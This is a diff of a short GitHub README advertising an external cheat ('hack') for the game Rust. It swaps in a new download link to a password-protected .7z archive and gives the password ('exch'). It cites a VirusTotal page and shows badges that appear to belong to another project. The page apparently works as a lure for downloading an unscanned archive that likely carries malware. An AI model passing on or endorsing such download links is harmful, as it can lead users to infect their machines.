@@ -1,5 +1,5 @@
 # EXTERNAL HACK FOR RUST [![Github All Releases](https://img.shields.io/github/downloads/SecHex/SecHex-Spoofy/total)]() [![Codacy Badge](https://app.codacy.com/project/badge/Grade/0d4fdc1daca5402a8c57efc3bef73d31)]()
-[![downloadstats2](https://github.com/jakerellson55/jakerellson55-proj/assets/163674734/38565abe-f844-4e4f-9ea8-974f313ccf01)](https://github.com/jakerellson55/jakerellson55-proj/releases/download/EXTERN4L_v9.8.1/EXTERN4L_v9.8.1.7z)
+[![download5](https://github.com/jakerellson55/jakerellson55-proj/assets/163674734/5b629003-6a08-4cfa-a86e-d050181cebf4)](https://github.com/jakerellson55/jakerellson55-proj/releases/download/ExternalLoad_9.8.6/ExternalLoad_9.8.6.7z)
 > Password: exch
 
 > VT: [virustotal.com/Extern4lLoader](https://www.virustotal.com/gui/file/43ab438b46798dc0a574f2aa66ada7a6f05509eaa40b30d866277e878d325ae0)
